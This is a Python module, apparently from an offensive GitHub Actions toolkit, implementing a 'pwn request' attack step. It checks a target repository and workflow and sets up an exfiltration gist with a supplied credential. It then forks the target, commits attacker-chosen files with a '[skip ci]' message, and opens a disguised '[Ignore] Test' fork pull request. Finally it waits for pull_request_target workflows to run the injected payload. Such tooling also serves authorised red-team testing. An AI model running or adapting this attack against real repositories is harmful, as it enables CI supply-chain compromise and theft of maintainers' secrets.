import time
import random
import string

from gatox.attack.pwnrequest.steps.attack_step import AttackStep
from gatox.cli.output import Output
from gatox.attack.utilities import AttackUtilities

from gatox.attack.payloads.payloads import Payloads


class PullRequest(AttackStep):
    """Represents creating a draft fork pull request with a Pwn request payload.

    This could be used to trigger branch injection, pwn requests, etc.
    """

    def __init__(
        self,
        target_repository,
        target_branch,
        source_branch,
        target_workflow,
        exfil_credential,
        modified_files=[],
        pr_title="[Ignore] Test",
        timeout=60,
        has_payload=False,
    ):
        """
        Initializes the PullRequest attack step.

        Args:
            target_repository (str): The repository to target for the pull request in 'owner/repo' format.
            target_branch (str): The branch in the target repository to merge into.
            source_branch (str): The branch in the forked repository containing changes.
            target_workflow (str): The workflow file to trigger in the target repository.
            exfil_credential (str): Credentials used for exfiltration purposes.
            modified_files (list, optional): List of files to modify in the commit. Each item should be a dict with 'local_path' and 'name'. Defaults to [].
            pr_title (str, optional): Title of the pull request. Defaults to "[Ignore] Test".
            timeout (int, optional): Timeout in seconds for operations like waiting for workflow runs. Defaults to 60.
        """
        self.output = {}
        self.modified_files = modified_files
        self.target_repo = target_repository
        self.target_branch = target_branch
        self.source_branch = source_branch
        self.step_data = (
            f"Attack: {target_repository}:{target_branch}:{target_workflow}"
        )
        self.target_workflow = target_workflow
        self.exfil_credential = exfil_credential
        self.pr_title = pr_title
        self.timeout = timeout
        self.has_payload = has_payload

    def setup(self, api):
        """
        Validates preconditions for executing the PullRequest step.

        This method performs several checks to ensure that the attack can proceed:

        1. **Repository Validation:**
           - Checks if the target repository exists.
           - Ensures the repository is not archived.
           - Determines if the repository is public or allows forking if it's private.

        2. **Workflow Validation:**
           - Verifies the existence of the specified workflow file in the target branch.

        3. **Branch Validation:**
           - Confirms whether the target branch exists in the repository.

        4. **Payload Generation:**
           - Generates a random `catcher_gist` ID.
           - Creates an exfiltration payload using the provided credentials.
           - Uploads the payload to a new secret Gist.

        5. **User Interaction:**
           - Prompts the user to confirm the placement of the payload in the injection point defined in the template YAML.

        Args:
            api (Api): The GitHub API interface.
            previous_results (dict, optional): Results from previous attack steps. Defaults to {}.

        Returns:
            bool: `True` if all preconditions are met and the payload is successfully generated, `False` otherwise.
        """
        # Check if the repository is public
        repo_info = api.get_repository(self.target_repo)

        if not repo_info:
            Output.error("Failed to get repository information!")
            return False

        if repo_info.get("archived") == True:
            Output.error("Repository is archived!")
            return False

        # Check if the repository is public
        if repo_info.get("visibility") != "public":
            # Repository is not public, check if it allows forking
            if not repo_info.get("allow_forking", False):
                Output.error("Repository is private and does not allow forking!")
                return

        workflow = api.retrieve_repo_file(
            self.target_repo,
            f".github/workflows/{self.target_workflow}",
            self.target_branch,
        )
        if not workflow:
            Output.error(
                f"Target workflow {self.target_workflow} does not exist on target branch!"
            )
            return False

        res = api.get_repo_branch(self.target_repo, self.target_branch)
        if res == 0:
            Output.error(f"Target branch, {self.target_branch}, does not exist!")
            return False
        elif res == -1:
            Output.error("Failed to check for target branch!")
            return False

        if self.has_payload:

            catcher_gist, gist_id = AttackUtilities.create_exfil_gist(
                api, self.exfil_credential
            )

            self.output["catcher_gist"] = catcher_gist
            self.output["exfil_gist"] = gist_id

            Output.info("Enter 'Confirm' when ready to continue.")

            user_input = input()
            if user_input.lower() != "confirm":
                Output.warn("Exiting attack!")
                return False

        return True

    def execute(self, api):
        """
        Executes the PullRequest attack step after validating preconditions.

        This method performs the following actions:

        1. **Fork Repository:**
           - Forks the target repository.
           - Checks if the fork was successful within the specified timeout.

        2. **Commit Modified Files:**
           - Iterates over the list of modified files.
           - Reads and commits each file to the source branch of the forked repository.

        3. **Create Pull Request:**
           - Retrieves the current authenticated user.
           - Creates a pull request from the forked repository's source branch to the target repository's branch.

        4. **Monitor Workflow Runs:**
           - Waits for the specified workflow to be triggered by the pull request.
           - Checks for workflow runs initiated by the current user and matching the target workflow.
           - Sleeps for 5 seconds between checks until the timeout is reached.

        Args:
            api (Api): The GitHub API interface.

        Returns:
            bool: `True` if the pull request is successfully created and the workflow is triggered, `False` otherwise.
        """
        fork_repo = AttackUtilities.fork_and_check_repository(
            api, self.target_repo, self.timeout
        )

        for file in self.modified_files:
            with open(file["local_path"], "rb") as f:
                contents = f.read()

            if contents:
                api.commit_file(
                    fork_repo,
                    self.source_branch,
                    file["name"],
                    contents,
                    message="[skip ci]",
                )
            else:
                Output.error(f"Failed to read contents of file {file['local_path']}!")
                return False

        current_user = api.get_user()

        result = api.create_fork_pr(
            self.target_repo,
            current_user,
            self.source_branch,
            self.target_branch,
            self.pr_title,
        )

        if result:
            Output.info(
                f"Fork pull request created successfully, you can view it at {result}!"
            )
            self.output["pr_number"] = result.split("/")[-1]
        else:
            Output.error("Failed to create fork pull request!")
            return False

        # Check for the PR workflow
        Output.info(f"Waiting for {self.target_workflow} to be triggered by user...")
        runs = []
        start_time = time.time()
        while time.time() - start_time < self.timeout:
            runs = api.get_workflow_runs_by_user_and_trigger(
                self.target_repo,
                current_user,
                self.target_workflow,
                ["pull_request_target"],
            )
            if not runs:
                time.sleep(5)
            else:
                Output.info("Pull request triggered!")
                break
        if not runs:
            Output.info(
                f"Unable to get runs triggered by user for {self.target_workflow}!"
            )
            self.output["status"] = "FAILURE"

        return True
